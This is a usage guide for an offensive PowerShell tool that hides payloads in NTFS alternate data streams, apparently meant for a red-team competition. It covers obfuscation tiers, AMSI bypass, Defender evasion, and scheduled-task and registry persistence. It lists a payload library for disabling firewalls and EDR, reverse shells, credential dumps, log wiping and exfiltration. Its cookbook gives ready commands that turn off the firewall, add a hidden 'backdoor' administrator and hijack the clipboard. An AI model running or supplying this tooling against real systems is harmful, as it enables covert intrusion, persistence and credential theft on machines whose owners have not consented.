# ADS v2.4 — Quick Start Reference

> **The existing `docs/ADS-ONELINER-HELP.md` and `docs/ADS-DROPPER-HELP.md` are outdated (v2.1 parameter sets). Use this file instead.**

**Workflow:** Run ADS-OneLiner on Kali → paste output file on Windows target. ADS-Dropper is called automatically — you never run it directly.

---

## The One Command You Need Most

```bash
# Kali — generate a payload and save to a file
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'YOUR PAYLOAD HERE' \
    -OutputFile /tmp/target-name.txt
"
# Then: paste the contents of /tmp/target-name.txt into a Windows PowerShell prompt
```

With no extra flags, this uses: Obfuscate=**Advanced** (deep placement + randomized names), Persist=**task**, Triggers=**AtLogOn + AtStartup**, Compression=**on**, PeriodicMinutes=**5**, JitterPercent=**20**.

---

## Full Parameter Reference (v2.4 accurate)

### Payload input — pick one

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Payload 'cmd'` | string | Inline PowerShell string. Use single quotes in bash. |
| `-PayloadFile /path/file.ps1` | string | Read payload from a file. Best for multi-line payloads. |
| `-PayloadAtDeployment` | switch | Prompts for payload at paste-time on Windows. |

### Output

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `-OutputFile path` | string | `ads-payload.txt` | Where to save the generated deployment file. |
| `-ManifestDir path` | string | `./manifests` | Where to save the cleanup manifest. |

### Stealth tier — the most important decision

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `-Obfuscate None\|Basic\|Advanced\|Paranoid` | string | `Advanced` | See tier table below. |

### Persistence

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `-Persist task\|registry\|none` | string | `task` | How payload is re-triggered. |
| `-Trigger` | string[] | `@('AtLogOn','AtStartup')` | When the task fires. See trigger guide. |
| `-PeriodicMinutes N` | int 1–1440 | `5` | How often the periodic task fires. |
| `-JitterPercent N` | int 0–50 | `20` | ±% randomization on timing. |
| `-InstanceCount N` | int 1–20 | `1` | Deploy N independent copies with unique paths/tasks. |

### Evasion

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `-UseCompression $true\|$false` | bool | `$true` | DeflateStream compression (~50% smaller). |
| `-Encrypt` | switch | off | AES-256 encrypt payload on disk. **See BUG-011 note.** |
| `-Randomize $true\|$false` | bool | Implied by tier | Randomize all artifact names. |
| `-UseDeepPlacement $true\|$false` | bool | Implied by tier | Bury ADS in `WER\Cache`, deep system dirs. |
| `-AttachToExisting $true\|$false` | bool | Implied by tier | Attach ADS to existing file vs. create new. |
| `-NoAmsi` | switch | off | Disable AMSI bypass injection (almost never use this). |

### Zero-width stream names (stealth stream naming)

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `-ZeroWidthStreams` | switch | Implied by Paranoid | Enable Unicode zero-width chars in stream name. |
| `-ZeroWidthMode single\|multi\|hybrid` | string | `single` | ZW character pattern. |
| `-HybridPrefix name` | string | — | Visible prefix for hybrid mode (e.g., `Zone.Identifier`). |
| `-CreateDecoys N` | int 0–10 | `0` | Create N benign decoy ADS streams. |

---

## Obfuscation Tier Guide

This is the primary dial. Most other evasion parameters are implied by the tier.

| Tier | Names | Placement | ZW Streams | When to use |
|------|-------|-----------|------------|-------------|
| `None` | Fixed (`SystemOptimization`) | `C:\ProgramData\` | No | Testing only. Never in competition. |
| `Basic` | Word-list randomized | `C:\ProgramData\` | No | Quick deployment, acceptable stealth. |
| `Advanced` | Word-list randomized | Deep (`WER\Cache`, etc.) | No | **Default. Standard CCDC deployment.** |
| `Paranoid` | Word-list randomized | Deep + attach to existing | Yes (ZW) | Max stealth. Slower, harder to clean up. |

**Tier-implied settings (you don't need to set these manually):**
- `Advanced` or `Paranoid` → implies `Randomize=$true`, `UseDeepPlacement=$true`, `AttachToExisting=$true`
- `Paranoid` → additionally implies `ZeroWidthStreams=$true`

**Override example** (Advanced stealth but no deep placement):
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 -Payload 'cmd' -Obfuscate Advanced -UseDeepPlacement \$false
"
```

---

## Trigger Guide

Task persistence can fire on multiple events simultaneously.

| Trigger | When it fires | Context |
|---------|---------------|---------|
| `AtLogOn` | User logs on | User session (interactive payloads work here) |
| `AtStartup` | System boots | SYSTEM context |
| `OnUnlock` | Workstation unlocked | User session |
| `OnIdle` | System idle | SYSTEM context |

Plus a periodic task (every `PeriodicMinutes` minutes) is **always added** regardless of trigger.

**Passing multiple triggers from bash:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'cmd' \
    -Trigger @('AtLogOn','AtStartup','OnUnlock')
"
```

**SYSTEM vs interactive context matters for meme payloads:**
- Clipboard, mouse, audio, visible windows → need `AtLogOn` or `OnUnlock` (user session)
- Firewall disable, registry edits, file writes, service kills → work from any context

---

## Payload Library

The `ops/payloads/ccdc-library.ps1` file contains 89 curated, pre-obfuscated payloads in 14 categories. Each is designed to pass directly to `-Payload`.

```bash
# Use a library payload by ID:
pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile ops/payloads/ccdc-library.ps1 \
  -Payload 'FW-002' \
  -Obfuscate Advanced \
  -OutputFile /tmp/fw-off.txt
```

| Category | IDs | What it does |
|----------|-----|-------------|
| `FW-*` | FW-001–008 | Disable firewall, open ports, nuclear silent kill |
| `RDP-*` | RDP-001–004 | Enable RDP, disable NLA, change port |
| `USR-*` | USR-001–006 | Local admin, hidden admin, password never expires |
| `SVC-*` | SVC-001–006 | Disable Defender, Sysmon, Event Log, EDR shotgun |
| `C2-*` | C2-001–007 | Download cradles, reverse shell, BITSAdmin, DNS beacon |
| `CRED-*` | CRED-001–008 | SAM/SYSTEM dump, Credential Manager, cred file hunt |
| `DEF-*` | DEF-001–009 | Clear logs, disable PS logging, wipe Defender history |
| `RECON-*` | RECON-001–006 | System enum, domain enum, privesc surface |
| `LAT-*` | LAT-001–005 | WinRM, PSRemoting, WMI, SMB shares, relay prep |
| `EXFIL-*` | EXFIL-001–003 | Stage files, HTTP exfil, ICMP beacon |
| `FUN-*` | FUN-001–008 | Desktop effects — **interactive session required** |
| `MEME-*` | MEME-001–009 | Fake BSOD, clipboard hijack, LED disco, Matrix rain, OIIA |
| `COMBO-*` | COMBO-001–003 | Multi-action packages (FW+RDP+admin+logging) |

See `tests/RED-TEAM-SHOWCASE.md` for curated scenarios.

---

## Session Isolation: SYSTEM vs. Interactive Payloads

Scheduled tasks run as `NT AUTHORITY\SYSTEM` in **Session 0** — a non-interactive session with no desktop, no audio, no clipboard access visible to the user.

**SYSTEM-safe (work from any context):**
- Firewall manipulation, registry edits, file writes, service control, credential dumps

**Interactive-only (require user session — must see desktop):**
- Memes with visible windows (notepads, ASCII art, screen effects)
- Audio (text-to-speech, music)
- Mouse/keyboard manipulation

**Rule:** For anything a human needs to see or hear, use `-Persist registry`.
Registry Run keys fire in the user's logon session.

```bash
# Meme payload — registry persist fires in user session
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'while($true){Set-Clipboard "Red Team Was Here";Start-Sleep 30}' \
  -Persist registry \
  -Obfuscate Basic \
  -OutputFile /tmp/meme.txt
```

---

## Known Issues (v2.4)

| Issue | Status | Workaround |
|-------|--------|-----------|
| **BUG-011:** `-Encrypt` triggering Defender (ClickFix.TFC) | **FIXED** — Sessions 12-16. T3-v2, T11-v2 confirmed PASS. T-REG-ENC pending re-validation. | None needed for task persist. Registry persist: run T-REG-ENC validation first. |
| **BUG-015:** DeflateStream evasion | **FIXED** — T2 validated PASS 2026-02-19. Defender CLEAN. | — |
| **BUG-018:** ZeroWidth + `registry` persist parser error | **FIXED** — Session 11. Validated PASS (RT1). | — |
| **BUG-014:** `git push origin test` rejected | Open | `git pull --rebase origin test && git push` |

---

## Scenario Cookbook

### Fastest possible deployment (Basic stealth, task, one trigger)
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'netsh advfirewall set allprofiles state off' \
    -Obfuscate Basic \
    -OutputFile /tmp/fast.txt
"
```

### Standard CCDC deployment (Advanced stealth, multi-trigger, redundant instances)
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'netsh advfirewall set allprofiles state off' \
    -Obfuscate Advanced \
    -Trigger @('AtLogOn','AtStartup','OnUnlock') \
    -InstanceCount 3 \
    -OutputFile /tmp/fw-advanced.txt
"
```

### Payload from a file (multi-line script)
```bash
cat > /tmp/mypayload.ps1 << 'EOF'
net user backdoor P@ss1234! /add
net localgroup administrators backdoor /add
EOF

pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -PayloadFile /tmp/mypayload.ps1 \
    -Obfuscate Advanced \
    -OutputFile /tmp/admin-payload.txt
"
```

### Max stealth (Paranoid — zero-width streams, deep placement)
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'YOUR_PAYLOAD' \
    -Obfuscate Paranoid \
    -InstanceCount 2 \
    -OutputFile /tmp/paranoid.txt
"
# IMPORTANT: Save the manifest from ./manifests/ — you CANNOT clean up zero-width streams without it
```

### No persistence (test payload execution only)
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'whoami; hostname' \
    -Persist none \
    -Obfuscate None \
    -OutputFile /tmp/test-nopers.txt
"
```

### Registry persistence (survives task cleanup, works without admin)
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'YOUR_PAYLOAD' \
    -Persist registry \
    -Obfuscate Basic \
    -OutputFile /tmp/registry.txt
"
# Note: BUG-018 — registry + ZeroWidth (Paranoid tier) may fail silently. Use Basic or Advanced.
```

### Meme payload — interactive session (AtLogOn trigger)
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'while(\$true){Set-Clipboard \"Red Team <3\";Start-Sleep 30}' \
    -Trigger AtLogOn \
    -Obfuscate Basic \
    -OutputFile /tmp/meme-clipboard.txt
"
```

### Turn off compression (smaller attack surface, larger one-liner)
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'YOUR_PAYLOAD' \
    -UseCompression \$false \
    -OutputFile /tmp/no-compress.txt
"
```

---

## Output File Anatomy

The generated file has three sections. You always paste the **OPTION 1** one-liner on Windows:

```
╔══════════════════════════════╗
║ CONFIGURATION SUMMARY         ║  ← Read to verify settings
╚══════════════════════════════╝

╔══════════════════════════════╗
║ OPTION 1: Base64 One-Liner   ║  ← PASTE THIS on Windows target
╚══════════════════════════════╝
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand AAAA...

╔══════════════════════════════╗
║ OPTION 2: Readable Commands  ║  ← Use for debugging only
╚══════════════════════════════╝

╔══════════════════════════════╗
║ CLEANUP                      ║  ← Save this for recovery
╚══════════════════════════════╝
```

**On Windows:** Open PowerShell (as Administrator for task/SYSTEM persistence). Paste the OPTION 1 line. Press Enter. Watch for `[+] Deployment complete`.

---

## What -Obfuscate Actually Controls

| What changes | None | Basic | Advanced | Paranoid |
|-------------|------|-------|----------|---------|
| Task/file names | Fixed (`SystemOptimization`) | Random words | Random words | Random words |
| Companion task suffix | Fixed | Random | Random | Random |
| `Randomize` | $false | $false | **$true** | **$true** |
| `UseDeepPlacement` | $false | $false | **$true** | **$true** |
| `AttachToExisting` | $false | $false | **$true** | **$true** |
| ZeroWidth streams | No | No | No | **Yes** |
| Registry key names | Fixed | Random | Random | Random |

---

## Bash Escaping Rules

| Situation | How to handle |
|-----------|---------------|
| Simple string payload | Use single quotes: `-Payload 'Write-Host ok'` |
| Payload with `$` variables | Single quotes prevent bash expansion — PS evaluates them at runtime |
| Multi-line payload | Write to file, use `-PayloadFile` |
| Boolean parameters | Pass as `\$true` or `\$false` inside `pwsh -Command "..."` |
| Array parameter (Trigger) | Inside Command string: `-Trigger @('AtLogOn','AtStartup')` |

---

## Cleanup (on Windows)

The generated output file includes a `CLEANUP` section at the bottom. Also check your manifest in `./manifests/manifest-*.json` for the exact paths, task names, and stream codepoints.

```powershell
# Quick: remove all non-Microsoft tasks
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } |
    ForEach-Object { Unregister-ScheduledTask $_.TaskName -Confirm:$false }

# Check registry Run keys for leftover entries
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object * -ExcludeProperty PS*
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object * -ExcludeProperty PS*
```

For zero-width (Paranoid tier) streams: use the codepoints from the manifest — the stream name is invisible and cannot be typed manually.
